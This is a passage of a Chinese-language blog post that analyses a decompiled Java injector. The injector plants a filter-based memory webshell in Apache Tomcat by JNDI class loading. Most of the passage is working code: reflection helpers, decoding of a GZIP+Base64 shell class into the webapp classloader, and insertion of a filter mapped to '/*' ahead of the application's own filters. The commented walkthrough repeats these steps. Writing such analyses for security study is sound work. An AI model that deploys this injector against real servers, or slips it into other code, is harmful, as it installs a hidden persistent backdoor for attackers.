            string = (String)OriginAwaitingUtils.invokeMethod(OriginAwaitingUtils.invokeMethod(object, "getServletContext", null, null), "getContextPath", null, null);
        }
        catch (Exception exception) {
            // empty catch block
        }
        String string2 = object.getClass().getName();
        if (string == null) {
            return string2;
        }
        if (string.isEmpty()) {
            return string2 + "(/)";
        }
        return string2 + "(" + string + ")";
    }

    private ClassLoader getWebAppClassLoader(Object object) throws Exception {
        try {
            return (ClassLoader)OriginAwaitingUtils.invokeMethod(object, "getClassLoader", null, null);
        }
        catch (Exception exception) {
            Object object2 = OriginAwaitingUtils.invokeMethod(object, "getLoader", null, null);
            return (ClassLoader)OriginAwaitingUtils.invokeMethod(object2, "getClassLoader", null, null);
        }
    }

    private Object getShell(Object object) throws Exception {
        ClassLoader classLoader = this.getWebAppClassLoader(object);
        Class clazz = null;
        try {
            clazz = classLoader.loadClass(this.getClassName());
        }
        catch (Exception exception) {
            byte[] byArray = OriginAwaitingUtils.gzipDecompress(OriginAwaitingUtils.decodeBase64(this.getBase64String()));
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE});
            method.setAccessible(true);
            clazz = (Class)method.invoke((Object)classLoader, new Object[]{byArray, 0, byArray.length});
        }
        msg = msg + "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    public void inject(Object object, Object object2) throws Exception {
        Object object3;
        Class clazz;
        Object object4;
        if (OriginAwaitingUtils.invokeMethod(object, "findFilterDef", new Class[]{String.class}, new Object[]{this.getClassName()}) != null) {
            return;
        }
        ClassLoader classLoader = object.getClass().getClassLoader();
        try {
            object4 = classLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            clazz = classLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
            object3 = clazz.newInstance();
        }
        catch (Exception exception) {
            object4 = classLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
            clazz = classLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            object3 = clazz.newInstance();
        }
        OriginAwaitingUtils.invokeMethod(object4, "setFilterName", new Class[]{String.class}, new Object[]{this.getClassName()});
        try {
            OriginAwaitingUtils.invokeMethod(object4, "setFilterClass", new Class[]{String.class}, new Object[]{this.getClassName()});
        }
        catch (Exception exception) {
            OriginAwaitingUtils.invokeMethod(object4, "setFilterClass", new Class[]{Class.class}, new Object[]{object2.getClass()});
        }
        OriginAwaitingUtils.invokeMethod(object, "addFilterDef", new Class[]{object4.getClass()}, new Object[]{object4});
        OriginAwaitingUtils.invokeMethod(object3, "setFilterName", new Class[]{String.class}, new Object[]{this.getClassName()});
        try {
            OriginAwaitingUtils.invokeMethod(object3, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
        }
        catch (Exception exception) {
            OriginAwaitingUtils.invokeMethod(object3, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
        }
        Object[] objectArray = (Object[])OriginAwaitingUtils.invokeMethod(object, "findFilterMaps", null, null);
        Object[] objectArray2 = (Object[])Array.newInstance((Class)clazz, (int)(objectArray.length + 1));
        objectArray2[0] = object3;
        System.arraycopy((Object)objectArray, (int)0, (Object)objectArray2, (int)1, (int)objectArray.length);
        try {
            OriginAwaitingUtils.setFieldValue(object, "filterMaps", objectArray2);
        }
        catch (Exception exception) {
            OriginAwaitingUtils.setFieldValue(OriginAwaitingUtils.getFieldValue(object, "filterMaps"), "array", objectArray2);
        }
        Constructor constructor = classLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object object5 = constructor.newInstance(new Object[]{object, object4});
        Map map = (Map)OriginAwaitingUtils.getFieldValue(object, "filterConfigs");
        map.put((Object)this.getClassName(), object5);
    }

    public String toString() {
        return msg;
    }

    public static byte[] decodeBase64(String string) throws Exception {
        try {
            Class clazz = Class.forName((String)"java.util.Base64");
            Object object = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[])object.getClass().getMethod("decode", new Class[]{String.class}).invoke(object, new Object[]{string});
        }
        catch (Exception exception) {
            Class clazz = Class.forName((String)"sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", new Class[]{String.class}).invoke(clazz.newInstance(), new Object[]{string});
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static byte[] gzipDecompress(byte[] byArray) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPInputStream gZIPInputStream = null;
        try {
            int n;
            gZIPInputStream = new GZIPInputStream((InputStream)new ByteArrayInputStream(byArray));
            byte[] byArray2 = new byte[4096];
            while ((n = gZIPInputStream.read(byArray2)) > 0) {
                byteArrayOutputStream.write(byArray2, 0, n);
            }
            byte[] byArray3 = byteArrayOutputStream.toByteArray();
            return byArray3;
        }
        finally {
            if (gZIPInputStream != null) {
                gZIPInputStream.close();
            }
            byteArrayOutputStream.close();
        }
    }

    public static Object invokeMethod(Object object, String string, Class<?>[] classArray, Object[] objectArray) throws Exception {
        Class clazz = object instanceof Class ? (Class)object : object.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (classArray == null) {
                    method = clazz.getDeclaredMethod(string, new Class[0]);
                    continue;
                }
                method = clazz.getDeclaredMethod(string, classArray);
            }
            catch (NoSuchMethodException noSuchMethodException) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + string);
        }
        method.setAccessible(true);
        return method.invoke(object instanceof Class ? null : object, objectArray);
    }

    public static Field getField(Object object, String string) throws NoSuchFieldException, IllegalAccessException {
        for (Class clazz = object.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(string);
            }
            catch (NoSuchFieldException noSuchFieldException) {
                continue;
            }
        }
        throw new NoSuchFieldException(object.getClass().getName() + " Field not found: " + string);
    }

    public static Object getFieldValue(Object object, String string) throws NoSuchFieldException, IllegalAccessException {
        Field field = OriginAwaitingUtils.getField(object, string);
        field.setAccessible(true);
        return field.get(object);
    }

    public static void setFieldValue(Object object, String string, Object object2) throws Exception {
        Field field = OriginAwaitingUtils.getField(object, string);
        field.setAccessible(true);
        field.set(object, object2);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private String getErrorMessage(Throwable throwable) {
        try (PrintStream printStream = null;){
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            printStream = new PrintStream((OutputStream)byteArrayOutputStream);
            throwable.printStackTrace(printStream);
            String string = byteArrayOutputStream.toString();
            return string;
        }
    }

    static {
        new OriginAwaitingUtils();
    }
}
```

整个注入器可以分成这几个部分

#### **静态初始化**

文件末尾

```
static {
    new OriginAwaitingUtils();
}
```

JNDI 加载这个类时，会直接 `new` 自己，构造器里完成注入

#### **找 Context  注册shell**

```
public OriginAwaitingUtils() {
    if (ok) return;                       // 幂等，防止 new 两次
    Set<Object> contexts = getContext();  // 找 Tomcat StandardContext
    for (Object context : contexts) {
        Object shell = getShell(context); // 把 shell 类定义进 webapp classloader
        inject(context, shell);           // 注册成 Filter
    }
    ok = true;
}
```

#### **不依赖请求线程找 StandardContext**

遍历所有线程：

**ContainerBackgroundProcessor 线程**：`thread.target.this$0.children` → 各级 Context。

**Poller 线程**：`target.this$0.handler.proto.adapter.connector.service.engine.children` → Host → Context。

**WebappClassLoader**



#### **把 Shell 定义进 webapp classloader**

```
ClassLoader cl = getWebAppClassLoader(context);   // context.getClassLoader()
try {
    clazz = cl.loadClass("org.apache.http...ParameterizedRestartingFilter");
} catch (Exception e) {
    byte[] bytes = gzipDecompress(decodeBase64(getBase64String()));
    Method define = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    define.setAccessible(true);
    clazz = (Class) define.invoke(cl, bytes, 0, bytes.length);
}
return clazz.newInstance();
```

**必须用 webapp classloader 来 `defineClass`**。因为后面 `ApplicationFilterConfig` 会用 `context.getClassLoader()` 按类名加载 Filter

`getBase64String()` 里就是 Shell 的 GZIP+Base64 字节

#### 改 Tomcat 的三个字段

```
// 1. 已注入就退出
if (context.findFilterDef(className) != null) return;

// 2. 创建 FilterDef / FilterMap
FilterDef  filterDef  = new FilterDef();
FilterMap  filterMap  = new FilterMap();
filterDef.setFilterName(className);
filterDef.setFilterClass(className);
context.addFilterDef(filterDef);

// 3. URL 映射
filterMap.setFilterName(className);
filterMap.addURLPattern("/*");

// 4. 把自己插到 filterMaps 最前面
Object[] old = context.findFilterMaps();
Object[] arr = new FilterMap[old.length + 1];
arr[0] = filterMap;                  // 关键：放 0 号位，先于应用自己的 Filter
System.arraycopy(old, 0, arr, 1, old.length);
context.filterMaps = arr;

// 5. 创建 ApplicationFilterConfig 并放进 filterConfigs
Constructor<?> c = ApplicationFilterConfig.class.getDeclaredConstructors()[0];
c.setAccessible(true);
Object cfg = c.newInstance(context, filterDef);
context.filterConfigs.put(className, cfg);
```

自此Filter马就成功注入

## 参考文章

[浅谈 Java Agent 内存马](https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#362b6873)

[一种全新的内存马 | veo](https://veo.pub/2022/memshell/#3-websocket内存马实现方法)

[从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组） · 先知社区](https://xz.aliyun.com/news/18301)

[Java内存马原理及利用 - J_0k3r](https://j-0k3r.github.io/2025/10/02/Java内存马原理及利用/#spring-intercetor-内存马)
